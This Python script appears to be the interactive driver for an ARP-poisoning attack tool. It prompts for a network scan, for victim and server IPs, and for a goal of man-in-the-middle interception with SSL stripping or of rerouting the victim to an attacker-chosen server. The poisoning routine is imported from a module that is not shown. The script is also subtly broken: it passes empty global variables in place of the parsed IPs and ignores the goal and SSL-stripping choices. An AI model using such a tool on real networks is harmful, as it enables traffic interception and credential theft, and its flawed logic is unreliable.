import ARPpoisoning as ARP;
victimIP = ""
serverIP = ""


def main():
    while True:
        ipt = input("Enter a command: Scan, ARP, quit: ").strip().lower()

        if ipt == "scan":
            ip_range = input("Enter ip range").strip().lower()
            hosts = ARP.network_scan(ip_range)
            for host in hosts:
                print(host)
        elif ipt == "arp":
            targets = input("Enter 'victim ip, server ip' Can both be none").strip().lower()
            goal = input("Enter a goal: mitm, ownServer").strip().lower()
            ownServer = ""
            sslStrip = ""
            if goal == "ownserver":
                ownServer = input("Enter a ip adress to reroute victim to").strip().lower()
            elif goal == "mitm":
                sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
            parts = [p.strip() for p in targets.split(',')]
            
            if len(parts) == 2:
                victim_ip = parts[0] if parts[0] != "none" else None
                server_ip = parts[1] if parts[1] != "none" else None
                print(f"Victim IP: {victim_ip}")
                print(f"Server IP: {server_ip}")
                ARP.arp_poisonening(victimIP, serverIP)
            else:
                print("Invalid input format. Please enter in the form: 'victim ip, server ip'")
        elif ipt == "quit":
            break
        else:
            print("Unknown command. Try again.")

if __name__ == "__main__":
    main()